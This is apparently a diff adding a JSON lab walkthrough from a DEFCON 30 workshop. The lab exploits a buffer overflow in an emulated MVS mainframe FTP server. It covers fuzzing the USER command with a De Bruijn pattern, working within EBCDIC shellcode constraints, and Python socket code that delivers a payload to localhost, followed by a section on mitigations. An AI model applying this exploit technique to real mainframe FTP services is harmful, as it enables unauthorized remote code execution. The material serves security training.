@@ -1,0 +1,41 @@
+{
+  "id": "dc30-ftp-overflow",
+  "title": "DC30 Lab 10: FTP Buffer Overflow — Remote Code Execution",
+  "description": "Exploit a buffer overflow in the MVS FTP server via a long USER command. Use De Bruijn patterns to find the offset, craft EBCDIC-safe shellcode, and achieve remote code execution on the mainframe over the network — no TSO session required.",
+  "category": "security",
+  "difficulty": "advanced",
+  "source": "DC30_Workshop / DEFCON 30",
+  "walkthrough": true,
+  "steps": [
+    {
+      "title": "The Attack Surface",
+      "screen": "FTP Buffer Overflow — Remote Attack\n\nTarget: MVS FTPD server on port 2121\nVuln:   Long USER command overflows a fixed buffer\nResult: Remote code execution as the FTP server address space\n\nWhy this differs from the HELLO overflow:\n  - No TSO session needed — pure network attack\n  - FTP runs as a started task with elevated privileges\n  - Shellcode must survive FTP protocol parsing\n  - EBCDIC encoding constraints apply to every byte\n\nPrerequisites:\n  - FTPD running: submit jcl/ftpd.jcl first\n  - Verify: nc -z localhost 2121\n  - Tools: scripts/e2alookup.py, scripts/findbytes.py",
+      "expected": "Confirm FTPD is running on port 2121 and understand the attack surface.",
+      "hint": "Start FTPD by submitting jcl/ftpd.jcl via port 3505, or POST /api/mainframe/start-ftpd. Verify with: python scripts/herc_automation.py --status"
+    },
+    {
+      "title": "Probe the Overflow",
+      "screen": "Generate a 1500-byte De Bruijn sequence and send as FTP USER:\n\n  python3 -c \"\nimport socket\ns = socket.socket()\ns.connect(('localhost', 2121))\nprint(s.recv(1024))          # 220 banner\npattern = 'AABACADAEAFAGAHAIAJAKALAMANA...'  # De Bruijn 1500\ns.send(f'USER {pattern}\\r\\n'.encode())\nprint(s.recv(1024))\n\"\n\nIf the FTP server crashes, check hardcopy.log:\n  tail -20 tk5/mvs-tk5/log/hardcopy.log\n\nThe 4 bytes at the crash address = your offset in De Bruijn.",
+      "expected": "Send a 1500-byte De Bruijn USER command and observe the FTP server crash.",
+      "hint": "Run DEBRUIJN.rex on the mainframe to generate the pattern: TSO DEBRUIJN 1500. Download via FTP in ASCII mode. The crash address in hardcopy.log tells you the exact byte offset."
+    },
+    {
+      "title": "EBCDIC Shellcode Constraints",
+      "screen": "The EBCDIC Problem\n\nMVS FTP parses USER commands in EBCDIC.\nYour shellcode bytes must:\n  1. Be valid EBCDIC (no null bytes, no control chars)\n  2. Not be interpreted as FTP control characters\n  3. Survive ASCII->EBCDIC translation from Linux\n\nTools:\n  python scripts/a2etable.py       -- print full table\n  python scripts/e2alookup.py C1   -- EBCDIC C1 -> ASCII\n  python scripts/findbytes.py 90   -- find XOR-safe encoding\n\nXOR encoding trick:\n  If byte 0xXX is invalid, XOR with 0x99\n  Prepend a decoder stub that XORs back\n  findbytes.py automates this",
+      "expected": "Understand EBCDIC encoding constraints and use the conversion tools.",
+      "hint": "Key mappings: EBCDIC 0x40=space, 0xF0-0xF9=digits, 0xC1-0xC9=A-I, 0xD1-0xD9=J-R, 0xE2-0xE9=S-Z. Avoid 0x00-0x3F (control chars) and 0xFF."
+    },
+    {
+      "title": "Craft and Deliver the Exploit",
+      "screen": "WTO shellcode (proof of execution):\n  Assemble on mainframe -> download binary via FTP\n  Insert at De Bruijn offset\n  Set return address to point to shellcode\n\nSend exploit:\n  import socket\n  with open('exploit.bin','rb') as f: payload = f.read()\n  s = socket.socket()\n  s.connect(('localhost', 2121))\n  s.recv(1024)  # banner\n  s.send(b'USER ' + payload + b'\\r\\n')\n\nCheck hardcopy.log for:\n  +MAINFRAME PWNED VIA FTP",
+      "expected": "Send the exploit and see the WTO message in hardcopy.log.",
+      "hint": "Monitor: tail -f tk5/mvs-tk5/log/hardcopy.log | grep PWNED. Or use herc_automation.py: h.wait_for_string('MAINFRAME PWNED')"
+    },
+    {
+      "title": "Defenses and Mitigations",
+      "screen": "Why This Works on MVS 3.8j / TK5:\n  - No ASLR (addresses are static and predictable)\n  - No NX/DEP (stack memory is executable)\n  - No stack canaries\n  - FTPD runs with elevated authority\n\nModern z/OS Mitigations:\n  - ASLR via address space randomization\n  - Execute protection (NX equivalent)\n  - RACF program control\n  - SMF logging of all FTP sessions\n  - AT-TLS for encrypted FTP\n  - RACF profiles restricting FTP access\n\nReal-world relevance:\n  - Many shops run legacy FTPD versions\n  - FTP often bypasses network security monitoring\n  - FTP credentials = TSO credentials = full system access",
+      "expected": "Understand why this works and what modern z/OS does to prevent it.",
+      "hint": "In a real z/OS pentest, FTP is often the first service to probe. Even without buffer overflows, FTP gives you dataset read/write access using TSO credentials — which is often enough to escalate."
+    }
+  ]
+}
